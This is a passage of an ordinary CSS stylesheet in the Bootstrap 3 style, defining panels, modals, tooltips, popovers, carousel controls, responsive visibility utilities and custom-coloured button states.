        .panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child {
            border-left: 0;
        }

        .panel>.table-bordered>thead>tr>th:last-child,
        .panel>.table-bordered>thead>tr>td:last-child,
        .panel>.table-bordered>tbody>tr>th:last-child,
        .panel>.table-bordered>tbody>tr>td:last-child,
        .panel>.table-bordered>tfoot>tr>th:last-child,
        .panel>.table-bordered>tfoot>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>thead>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>thead>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child {
            border-right: 0;
        }

        .panel>.table-bordered>thead>tr:first-child>td,
        .panel>.table-bordered>thead>tr:first-child>th,
        .panel>.table-bordered>tbody>tr:first-child>td,
        .panel>.table-bordered>tbody>tr:first-child>th,
        .panel>.table-responsive>.table-bordered>thead>tr:first-child>td,
        .panel>.table-responsive>.table-bordered>thead>tr:first-child>th,
        .panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,
        .panel>.table-responsive>.table-bordered>tbody>tr:first-child>th {
            border-bottom: 0;
        }

        .panel>.table-bordered>tbody>tr:last-child>td,
        .panel>.table-bordered>tbody>tr:last-child>th,
        .panel>.table-bordered>tfoot>tr:last-child>td,
        .panel>.table-bordered>tfoot>tr:last-child>th,
        .panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,
        .panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,
        .panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,
        .panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th {
            border-bottom: 0;
        }

        .panel>.table-responsive {
            margin-bottom: 0;
            border: 0;
        }

        .panel-group {
            margin-bottom: 20px;
        }

        .panel-group .panel {
            margin-bottom: 0;
            border-radius: 6px;
        }

        .panel-group .panel+.panel {
            margin-top: 5px;
        }

        .panel-group .panel-heading {
            border-bottom: 0;
        }

        .panel-group .panel-heading+.panel-collapse>.panel-body,
        .panel-group .panel-heading+.panel-collapse>.list-group {
            border-top: 1px solid #CCCCCC;
        }

        .panel-group .panel-footer {
            border-top: 0;
        }

        .panel-group .panel-footer+.panel-collapse .panel-body {
            border-bottom: 1px solid #CCCCCC;
        }

        .panel-default {
            border-color: #CCCCCC;
        }

        .panel-default>.panel-heading {
            color: #333333;
            background-color: #F2F2F2;
            border-color: #CCCCCC;
        }

        .panel-default>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #CCCCCC;
        }

        .panel-default>.panel-heading .badge {
            color: #F2F2F2;
            background-color: #333333;
        }

        .panel-default>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #CCCCCC;
        }

        .panel-primary {
            border-color: #337ab7;
        }

        .panel-primary>.panel-heading {
            color: #fff;
            background-color: #337ab7;
            border-color: #337ab7;
        }

        .panel-primary>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #337ab7;
        }

        .panel-primary>.panel-heading .badge {
            color: #337ab7;
            background-color: #fff;
        }

        .panel-primary>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #337ab7;
        }

        .panel-success {
            border-color: #d6e9c6;
        }

        .panel-success>.panel-heading {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #d6e9c6;
        }

        .panel-success>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #d6e9c6;
        }

        .panel-success>.panel-heading .badge {
            color: #dff0d8;
            background-color: #3c763d;
        }

        .panel-success>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #d6e9c6;
        }

        .panel-info {
            border-color: #bce8f1;
        }

        .panel-info>.panel-heading {
            color: #31708f;
            background-color: #d9edf7;
            border-color: #bce8f1;
        }

        .panel-info>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #bce8f1;
        }

        .panel-info>.panel-heading .badge {
            color: #d9edf7;
            background-color: #31708f;
        }

        .panel-info>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #bce8f1;
        }

        .panel-warning {
            border-color: #faebcc;
        }

        .panel-warning>.panel-heading {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #faebcc;
        }

        .panel-warning>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #faebcc;
        }

        .panel-warning>.panel-heading .badge {
            color: #fcf8e3;
            background-color: #8a6d3b;
        }

        .panel-warning>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #faebcc;
        }

        .panel-danger {
            border-color: #ebccd1;
        }

        .panel-danger>.panel-heading {
            color: #a94442;
            background-color: #f2dede;
            border-color: #ebccd1;
        }

        .panel-danger>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #ebccd1;
        }

        .panel-danger>.panel-heading .badge {
            color: #f2dede;
            background-color: #a94442;
        }

        .panel-danger>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #ebccd1;
        }

        .embed-responsive {
            position: relative;
            display: block;
            height: 0;
            padding: 0;
            overflow: hidden;
        }

        .embed-responsive .embed-responsive-item,
        .embed-responsive iframe,
        .embed-responsive embed,
        .embed-responsive object,
        .embed-responsive video {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        .embed-responsive-16by9 {
            padding-bottom: 56.25%;
        }

        .embed-responsive-4by3 {
            padding-bottom: 75%;
        }

        .well {
            min-height: 20px;
            padding: 19px;
            margin-bottom: 20px;
            background-color: #f5f5f5;
            border: 1px solid #e3e3e3;
            border-radius: 4px;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
        }

        .well blockquote {
            border-color: #ddd;
            border-color: rgba(0, 0, 0, 0.15);
        }

        .well-lg {
            padding: 24px;
            border-radius: 6px;
        }

        .well-sm {
            padding: 9px;
            border-radius: 3px;
        }

        .close {
            float: right;
            font-size: 21px;
            font-weight: bold;
            line-height: 1;
            color: #000;
            text-shadow: 0 1px 0 #fff;
            filter: alpha(opacity=20);
            opacity: 0.2;
        }

        .close:hover,
        .close:focus {
            color: #000;
            text-decoration: none;
            cursor: pointer;
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        button.close {
            padding: 0;
            cursor: pointer;
            background: transparent;
            border: 0;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .modal-open {
            overflow: hidden;
        }

        .modal {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1050;
            display: none;
            overflow: hidden;
            -webkit-overflow-scrolling: touch;
            outline: 0;
        }

        .modal.fade .modal-dialog {
            transform: translate(0, -25%);
            transition: transform 0.3s ease-out;
        }

        .modal.in .modal-dialog {
            transform: translate(0, 0);
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto;
        }

        .modal-dialog {
            position: relative;
            width: auto;
            margin: 10px;
        }

        .modal-content {
            position: relative;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #999;
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 6px;
            box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
            outline: 0;
        }

        .modal-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1040;
            background-color: #000;
        }

        .modal-backdrop.fade {
            filter: alpha(opacity=0);
            opacity: 0;
        }

        .modal-backdrop.in {
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        .modal-header {
            padding: 15px;
            border-bottom: 1px solid #e5e5e5;
        }

        .modal-header:before,
        .modal-header:after {
            display: table;
            content: " ";
        }

        .modal-header:after {
            clear: both;
        }

        .modal-header .close {
            margin-top: -2px;
        }

        .modal-title {
            margin: 0;
            line-height: 1.42857143;
        }

        .modal-body {
            position: relative;
            padding: 15px;
        }

        .modal-footer {
            padding: 15px;
            text-align: right;
            border-top: 1px solid #e5e5e5;
        }

        .modal-footer:before,
        .modal-footer:after {
            display: table;
            content: " ";
        }

        .modal-footer:after {
            clear: both;
        }

        .modal-footer .btn+.btn {
            margin-bottom: 0;
            margin-left: 5px;
        }

        .modal-footer .btn-group .btn+.btn {
            margin-left: -1px;
        }

        .modal-footer .btn-block+.btn-block {
            margin-left: 0;
        }

        .modal-scrollbar-measure {
            position: absolute;
            top: -9999px;
            width: 50px;
            height: 50px;
            overflow: scroll;
        }

        @media (min-width: 768px) {
            .modal-dialog {
                width: 600px;
                margin: 30px auto;
            }

            .modal-content {
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            }

            .modal-sm {
                width: 300px;
            }
        }

        @media (min-width: 992px) {
            .modal-lg {
                width: 900px;
            }
        }

        .tooltip {
            position: absolute;
            z-index: 1070;
            display: block;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-style: normal;
            font-weight: 400;
            line-height: 1.42857143;
            line-break: auto;
            text-align: left;
            text-align: start;
            text-decoration: none;
            text-shadow: none;
            text-transform: none;
            letter-spacing: normal;
            word-break: normal;
            word-spacing: normal;
            word-wrap: normal;
            white-space: normal;
            font-size: 11px;
            filter: alpha(opacity=0);
            opacity: 0;
        }

        .tooltip.in {
            filter: alpha(opacity=100);
            opacity: 1;
        }

        .tooltip.top {
            padding: 5px 0;
            margin-top: -3px;
        }

        .tooltip.right {
            padding: 0 5px;
            margin-left: 3px;
        }

        .tooltip.bottom {
            padding: 5px 0;
            margin-top: 3px;
        }

        .tooltip.left {
            padding: 0 5px;
            margin-left: -3px;
        }

        .tooltip.top .tooltip-arrow {
            bottom: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.top-left .tooltip-arrow {
            right: 5px;
            bottom: 0;
            margin-bottom: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.top-right .tooltip-arrow {
            bottom: 0;
            left: 5px;
            margin-bottom: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.right .tooltip-arrow {
            top: 50%;
            left: 0;
            margin-top: -5px;
            border-width: 5px 5px 5px 0;
            border-right-color: #000;
        }

        .tooltip.left .tooltip-arrow {
            top: 50%;
            right: 0;
            margin-top: -5px;
            border-width: 5px 0 5px 5px;
            border-left-color: #000;
        }

        .tooltip.bottom .tooltip-arrow {
            top: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip.bottom-left .tooltip-arrow {
            top: 0;
            right: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip.bottom-right .tooltip-arrow {
            top: 0;
            left: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip-inner {
            max-width: 200px;
            padding: 3px 8px;
            color: #fff;
            text-align: center;
            background-color: #000;
            border-radius: 4px;
        }

        .tooltip-arrow {
            position: absolute;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid;
        }

        .popover {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1060;
            display: none;
            max-width: 276px;
            padding: 1px;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-style: normal;
            font-weight: 400;
            line-height: 1.42857143;
            line-break: auto;
            text-align: left;
            text-align: start;
            text-decoration: none;
            text-shadow: none;
            text-transform: none;
            letter-spacing: normal;
            word-break: normal;
            word-spacing: normal;
            word-wrap: normal;
            white-space: normal;
            font-size: 14px;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #ccc;
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 6px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        }

        .popover.top {
            margin-top: -10px;
        }

        .popover.right {
            margin-left: 10px;
        }

        .popover.bottom {
            margin-top: 10px;
        }

        .popover.left {
            margin-left: -10px;
        }

        .popover>.arrow {
            border-width: 11px;
        }

        .popover>.arrow,
        .popover>.arrow:after {
            position: absolute;
            display: block;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid;
        }

        .popover>.arrow:after {
            content: "";
            border-width: 10px;
        }

        .popover.top>.arrow {
            bottom: -11px;
            left: 50%;
            margin-left: -11px;
            border-top-color: #999999;
            border-top-color: rgba(0, 0, 0, 0.25);
            border-bottom-width: 0;
        }

        .popover.top>.arrow:after {
            bottom: 1px;
            margin-left: -10px;
            content: " ";
            border-top-color: #fff;
            border-bottom-width: 0;
        }

        .popover.right>.arrow {
            top: 50%;
            left: -11px;
            margin-top: -11px;
            border-right-color: #999999;
            border-right-color: rgba(0, 0, 0, 0.25);
            border-left-width: 0;
        }

        .popover.right>.arrow:after {
            bottom: -10px;
            left: 1px;
            content: " ";
            border-right-color: #fff;
            border-left-width: 0;
        }

        .popover.bottom>.arrow {
            top: -11px;
            left: 50%;
            margin-left: -11px;
            border-top-width: 0;
            border-bottom-color: #999999;
            border-bottom-color: rgba(0, 0, 0, 0.25);
        }

        .popover.bottom>.arrow:after {
            top: 1px;
            margin-left: -10px;
            content: " ";
            border-top-width: 0;
            border-bottom-color: #fff;
        }

        .popover.left>.arrow {
            top: 50%;
            right: -11px;
            margin-top: -11px;
            border-right-width: 0;
            border-left-color: #999999;
            border-left-color: rgba(0, 0, 0, 0.25);
        }

        .popover.left>.arrow:after {
            right: 1px;
            bottom: -10px;
            content: " ";
            border-right-width: 0;
            border-left-color: #fff;
        }

        .popover-title {
            padding: 8px 14px;
            margin: 0;
            font-size: 14px;
            background-color: #f7f7f7;
            border-bottom: 1px solid #ebebeb;
            border-radius: 5px 5px 0 0;
        }

        .popover-content {
            padding: 9px 14px;
        }

        .carousel {
            position: relative;
        }

        .carousel-inner {
            position: relative;
            width: 100%;
            overflow: hidden;
        }

        .carousel-inner>.item {
            position: relative;
            display: none;
            transition: 0.6s ease-in-out left;
        }

        .carousel-inner>.item>img,
        .carousel-inner>.item>a>img {
            display: block;
            max-width: 100%;
            height: auto;
            line-height: 1;
        }

        @media all and (transform-3d),
        (-webkit-transform-3d) {
            .carousel-inner>.item {
                transition: transform 0.6s ease-in-out;
                -webkit-backface-visibility: hidden;
                backface-visibility: hidden;
                perspective: 1000px;
            }

            .carousel-inner>.item.next,
            .carousel-inner>.item.active.right {
                transform: translate3d(100%, 0, 0);
                left: 0;
            }

            .carousel-inner>.item.prev,
            .carousel-inner>.item.active.left {
                transform: translate3d(-100%, 0, 0);
                left: 0;
            }

            .carousel-inner>.item.next.left,
            .carousel-inner>.item.prev.right,
            .carousel-inner>.item.active {
                transform: translate3d(0, 0, 0);
                left: 0;
            }
        }

        .carousel-inner>.active,
        .carousel-inner>.next,
        .carousel-inner>.prev {
            display: block;
        }

        .carousel-inner>.active {
            left: 0;
        }

        .carousel-inner>.next,
        .carousel-inner>.prev {
            position: absolute;
            top: 0;
            width: 100%;
        }

        .carousel-inner>.next {
            left: 100%;
        }

        .carousel-inner>.prev {
            left: -100%;
        }

        .carousel-inner>.next.left,
        .carousel-inner>.prev.right {
            left: 0;
        }

        .carousel-inner>.active.left {
            left: -100%;
        }

        .carousel-inner>.active.right {
            left: 100%;
        }

        .carousel-control {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 15%;
            font-size: 20px;
            color: #fff;
            text-align: center;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
            background-color: rgba(0, 0, 0, 0);
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        .carousel-control.left {
            background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);
            background-repeat: repeat-x;
        }

        .carousel-control.right {
            right: 0;
            left: auto;
            background-image: linear-gradient(to right, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);
            background-repeat: repeat-x;
        }

        .carousel-control:hover,
        .carousel-control:focus {
            color: #fff;
            text-decoration: none;
            outline: 0;
            filter: alpha(opacity=90);
            opacity: 0.9;
        }

        .carousel-control .icon-prev,
        .carousel-control .icon-next,
        .carousel-control .glyphicon-chevron-left,
        .carousel-control .glyphicon-chevron-right {
            position: absolute;
            top: 50%;
            z-index: 5;
            display: inline-block;
            margin-top: -10px;
        }

        .carousel-control .icon-prev,
        .carousel-control .glyphicon-chevron-left {
            left: 50%;
            margin-left: -10px;
        }

        .carousel-control .icon-next,
        .carousel-control .glyphicon-chevron-right {
            right: 50%;
            margin-right: -10px;
        }

        .carousel-control .icon-prev,
        .carousel-control .icon-next {
            width: 20px;
            height: 20px;
            font-family: serif;
            line-height: 1;
        }

        .carousel-control .icon-prev:before {
            content: "\2039";
        }

        .carousel-control .icon-next:before {
            content: "\203a";
        }

        .carousel-indicators {
            position: absolute;
            bottom: 10px;
            left: 50%;
            z-index: 15;
            width: 60%;
            padding-left: 0;
            margin-left: -30%;
            text-align: center;
            list-style: none;
        }

        .carousel-indicators li {
            display: inline-block;
            width: 10px;
            height: 10px;
            margin: 1px;
            text-indent: -999px;
            cursor: pointer;
            background-color: #000 \9;
            background-color: rgba(0, 0, 0, 0);
            border: 1px solid #fff;
            border-radius: 10px;
        }

        .carousel-indicators .active {
            width: 12px;
            height: 12px;
            margin: 0;
            background-color: #fff;
        }

        .carousel-caption {
            position: absolute;
            right: 15%;
            bottom: 20px;
            left: 15%;
            z-index: 10;
            padding-top: 20px;
            padding-bottom: 20px;
            color: #fff;
            text-align: center;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
        }

        .carousel-caption .btn {
            text-shadow: none;
        }

        @media screen and (min-width: 768px) {

            .carousel-control .glyphicon-chevron-left,
            .carousel-control .glyphicon-chevron-right,
            .carousel-control .icon-prev,
            .carousel-control .icon-next {
                width: 30px;
                height: 30px;
                margin-top: -10px;
                font-size: 30px;
            }

            .carousel-control .glyphicon-chevron-left,
            .carousel-control .icon-prev {
                margin-left: -10px;
            }

            .carousel-control .glyphicon-chevron-right,
            .carousel-control .icon-next {
                margin-right: -10px;
            }

            .carousel-caption {
                right: 20%;
                left: 20%;
                padding-bottom: 30px;
            }

            .carousel-indicators {
                bottom: 20px;
            }
        }

        .clearfix:before,
        .clearfix:after {
            display: table;
            content: " ";
        }

        .clearfix:after {
            clear: both;
        }

        .center-block {
            display: block;
            margin-right: auto;
            margin-left: auto;
        }

        .pull-right {
            float: right !important;
        }

        .pull-left {
            float: left !important;
        }

        .hide {
            display: none !important;
        }

        .show {
            display: block !important;
        }

        .invisible {
            visibility: hidden;
        }

        .text-hide {
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }

        .hidden {
            display: none !important;
        }

        .affix {
            position: fixed;
        }

        .visible-xs {
            display: none !important;
        }

        .visible-sm {
            display: none !important;
        }

        .visible-md {
            display: none !important;
        }

        .visible-lg {
            display: none !important;
        }

        .visible-xs-block,
        .visible-xs-inline,
        .visible-xs-inline-block,
        .visible-sm-block,
        .visible-sm-inline,
        .visible-sm-inline-block,
        .visible-md-block,
        .visible-md-inline,
        .visible-md-inline-block,
        .visible-lg-block,
        .visible-lg-inline,
        .visible-lg-inline-block {
            display: none !important;
        }

        @media (max-width: 767px) {
            .visible-xs {
                display: block !important;
            }

            table.visible-xs {
                display: table !important;
            }

            tr.visible-xs {
                display: table-row !important;
            }

            th.visible-xs,
            td.visible-xs {
                display: table-cell !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-block {
                display: block !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-inline {
                display: inline !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm {
                display: block !important;
            }

            table.visible-sm {
                display: table !important;
            }

            tr.visible-sm {
                display: table-row !important;
            }

            th.visible-sm,
            td.visible-sm {
                display: table-cell !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-block {
                display: block !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-inline {
                display: inline !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md {
                display: block !important;
            }

            table.visible-md {
                display: table !important;
            }

            tr.visible-md {
                display: table-row !important;
            }

            th.visible-md,
            td.visible-md {
                display: table-cell !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-block {
                display: block !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-inline {
                display: inline !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg {
                display: block !important;
            }

            table.visible-lg {
                display: table !important;
            }

            tr.visible-lg {
                display: table-row !important;
            }

            th.visible-lg,
            td.visible-lg {
                display: table-cell !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-block {
                display: block !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-inline {
                display: inline !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-inline-block {
                display: inline-block !important;
            }
        }

        @media (max-width: 767px) {
            .hidden-xs {
                display: none !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .hidden-sm {
                display: none !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .hidden-md {
                display: none !important;
            }
        }

        @media (min-width: 1200px) {
            .hidden-lg {
                display: none !important;
            }
        }

        .visible-print {
            display: none !important;
        }

        @media print {
            .visible-print {
                display: block !important;
            }

            table.visible-print {
                display: table !important;
            }

            tr.visible-print {
                display: table-row !important;
            }

            th.visible-print,
            td.visible-print {
                display: table-cell !important;
            }
        }

        .visible-print-block {
            display: none !important;
        }

        @media print {
            .visible-print-block {
                display: block !important;
            }
        }

        .visible-print-inline {
            display: none !important;
        }

        @media print {
            .visible-print-inline {
                display: inline !important;
            }
        }

        .visible-print-inline-block {
            display: none !important;
        }

        @media print {
            .visible-print-inline-block {
                display: inline-block !important;
            }
        }

        @media print {
            .hidden-print {
                display: none !important;
            }
        }

        html {
            height: 100%;
        }

        body {
            width: 100%;
            height: 100%;
        }

        a:active {
            color: #0d0d0d;
        }

        .btn:focus,
        .btn.focus,
        .btn:active:focus,
        .btn:active.focus,
        .btn.active:focus,
        .btn.active.focus {
            outline: 0;
            box-shadow: none;
        }

        .btn:active,
        .btn.active {
            box-shadow: none;
        }

        .btn-link,
        .btn-link:active,
        .btn-link.active,
        .btn-link[disabled],
        fieldset[disabled] .btn-link {
            color: #ef6421;
        }

        .btn-link:hover,
        .btn-link:focus {
            color: #ef6421;
        }

        a.nav-link,
        a.nav-link:active,
        a.nav-link.active,
        a.nav-link[disabled],
        fieldset[disabled] a.nav-link {
            color: #fff;
        }

        a.nav-link:hover,
        a.nav-link:focus {
            color: #fff;
        }

        .btn-primary {
            color: #FFFFFF;
            background-color: #ef6421;
            border-color: transparent;
        }

        .btn-primary:focus,
        .btn-primary.focus {
            color: #FFFFFF;
            background-color: #e15410;
            border-color: transparent;
            z-index: 3;
        }

        .btn-primary:hover {
            color: #FFFFFF;
            background-color: #e15410;
            border-color: transparent;
        }

        .btn-primary:active,
        .btn-primary.active,
        .open>.btn-primary.dropdown-toggle {
            color: #FFFFFF;
            background-color: #ce4d0f;
            background-image: none;
            border-color: transparent;
        }

        .btn-primary:active:hover,
        .btn-primary:active:focus,
        .btn-primary:active.focus,
        .btn-primary.active:hover,
        .btn-primary.active:focus,
        .btn-primary.active.focus,
        .open>.btn-primary.dropdown-toggle:hover,
        .open>.btn-primary.dropdown-toggle:focus,
        .open>.btn-primary.dropdown-toggle.focus {
            color: #FFFFFF;
            background-color: #ce4d0f;
            border-color: transparent;
        }

        .btn-primary.disabled:hover,
        .btn-primary.disabled:focus,
        .btn-primary.disabled.focus,
        .btn-primary[disabled]:hover,
        .btn-primary[disabled]:focus,
        .btn-primary[disabled].focus,
        fieldset[disabled] .btn-primary:hover,
        fieldset[disabled] .btn-primary:focus,
        fieldset[disabled] .btn-primary.focus {
            background-color: #ef6421;
            border-color: transparent;
        }

        .btn-primary .badge {
            color: #ef6421;
            background-color: #FFFFFF;
        }

        .btn-success {
            color: #fff;
            background-color: #50b450;
            border-color: transparent;
        }

        .btn-success:focus,
        .btn-success.focus {
            color: #fff;
            background-color: #45a145;
            border-color: transparent;
            z-index: 3;
        }

        .btn-success:hover {
            color: #fff;
            background-color: #45a145;
            border-color: transparent;
        }

        .btn-success:active,
        .btn-success.active,
        .open>.btn-success.dropdown-toggle {
            color: #fff;
            background-color: #3f923f;
            background-image: none;
            border-color: transparent;
        }

        .btn-success:active:hover,
        .btn-success:active:focus,
        .btn-success:active.focus,
        .btn-success.active:hover,
        .btn-success.active:focus,
        .btn-success.active.focus,
        .open>.btn-success.dropdown-toggle:hover,
        .open>.btn-success.dropdown-toggle:focus,
        .open>.btn-success.dropdown-toggle.focus {
            color: #fff;
            background-color: #3f923f;
            border-color: transparent;
        }

        .btn-success.disabled:hover,
        .btn-success.disabled:focus,
        .btn-success.disabled.focus,
        .btn-success[disabled]:hover,
        .btn-success[disabled]:focus,
        .btn-success[disabled].focus,
        fieldset[disabled] .btn-success:hover,
        fieldset[disabled] .btn-success:focus,
        fieldset[disabled] .btn-success.focus {
            background-color: #50b450;
            border-color: transparent;
        }

        .btn-success .badge {
            color: #50b450;
            background-color: #fff;
        }

        .btn-info {
            color: #fff;
            background-color: #3a98d8;
            border-color: transparent;
        }

        .btn-info:focus,
        .btn-info.focus {
            color: #fff;
            background-color: #2889cb;
            border-color: transparent;
            z-index: 3;
        }

        .btn-info:hover {
            color: #fff;
            background-color: #2889cb;
            border-color: transparent;
        }

        .btn-info:active,
        .btn-info.active,
        .open>.btn-info.dropdown-toggle {
            color: #fff;
            background-color: #257eba;
            background-image: none;
            border-color: transparent;
        }

        .btn-info:active:hover,
        .btn-info:active:focus,
        .btn-info:active.focus,
        .btn-info.active:hover,
        .btn-info.active:focus,
        .btn-info.active.focus,
        .open>.btn-info.dropdown-toggle:hover,
        .open>.btn-info.dropdown-toggle:focus,
        .open>.btn-info.dropdown-toggle.focus {
            color: #fff;
            background-color: #257eba;
            border-color: transparent;
        }

        .btn-info.disabled:hover,
        .btn-info.disabled:focus,
        .btn-info.disabled.focus,
        .btn-info[disabled]:hover,
        .btn-info[disabled]:focus,
        .btn-info[disabled].focus,
        fieldset[disabled] .btn-info:hover,
        fieldset[disabled] .btn-info:focus,
        fieldset[disabled] .btn-info.focus {
            background-color: #3a98d8;
            border-color: transparent;
        }

        .btn-info .badge {
            color: #3a98d8;
            background-color: #fff;
        }

        .btn-warning {
            color: #fff;
            background-color: #E5B700;
            border-color: transparent;
        }

        .btn-warning:focus,
        .btn-warning.focus {
            color: #fff;
            background-color: #c69f00;
            border-color: transparent;
            z-index: 3;
        }

        .btn-warning:hover {
            color: #fff;
            background-color: #c69f00;
            border-color: transparent;
        }

        .btn-warning:active,
        .btn-warning.active,
        .open>.btn-warning.dropdown-toggle {
            color: #fff;
            background-color: #b28e00;
            background-image: none;
            border-color: transparent;
        }

        .btn-warning:active:hover,
        .btn-warning:active:focus,
        .btn-warning:active.focus,
        .btn-warning.active:hover,
        .btn-warning.active:focus,
        .btn-warning.active.focus,
        .open>.btn-warning.dropdown-toggle:hover,
        .open>.btn-warning.dropdown-toggle:focus,
        .open>.btn-warning.dropdown-toggle.focus {
            color: #fff;
            background-color: #b28e00;
            border-color: transparent;
        }

        .btn-warning.disabled:hover,
        .btn-warning.disabled:focus,
        .btn-warning.disabled.focus,
        .btn-warning[disabled]:hover,
        .btn-warning[disabled]:focus,
        .btn-warning[disabled].focus,
        fieldset[disabled] .btn-warning:hover,
        fieldset[disabled] .btn-warning:focus,
        fieldset[disabled] .btn-warning.focus {
            background-color: #E5B700;
            border-color: transparent;
        }

        .btn-warning .badge {
            color: #E5B700;
            background-color: #fff;
        }

        .btn-danger {
            color: #FFFFFF;
            background-color: #d63636;
            border-color: transparent;
        }

        .btn-danger:focus,
        .btn-danger.focus {
            color: #FFFFFF;
            background-color: #c52828;
            border-color: transparent;
            z-index: 3;
        }

        .btn-danger:hover {
            color: #FFFFFF;
            background-color: #c52828;
            border-color: transparent;
        }

        .btn-danger:active,
        .btn-danger.active,
        .open>.btn-danger.dropdown-toggle {
            color: #FFFFFF;
            background-color: #b42525;
            background-image: none;
            border-color: transparent;
        }

        .btn-danger:active:hover,
        .btn-danger:active:focus,
        .btn-danger:active.focus,
        .btn-danger.active:hover,
        .btn-danger.active:focus,
        .btn-danger.active.focus,
        .open>.btn-danger.dropdown-toggle:hover,
        .open>.btn-danger.dropdown-toggle:focus,
        .open>.btn-danger.dropdown-toggle.focus {
            color: #FFFFFF;
            background-color: #b42525;
            border-color: transparent;
        }

        .btn-danger.disabled:hover,
        .btn-danger.disabled:focus,
        .btn-danger.disabled.focus,
        .btn-danger[disabled]:hover,
        .btn-danger[disabled]:focus,
        .btn-danger[disabled].focus,
        fieldset[disabled] .btn-danger:hover,
        fieldset[disabled] .btn-danger:focus,
        fieldset[disabled] .btn-danger.focus {
            background-color: #d63636;
            border-color: transparent;
        }

        .btn-danger .badge {
            color: #d63636;
            background-color: #FFFFFF;
        }

        .btn-secondary {
            color: #333333;
            background-color: #FFFFFF;
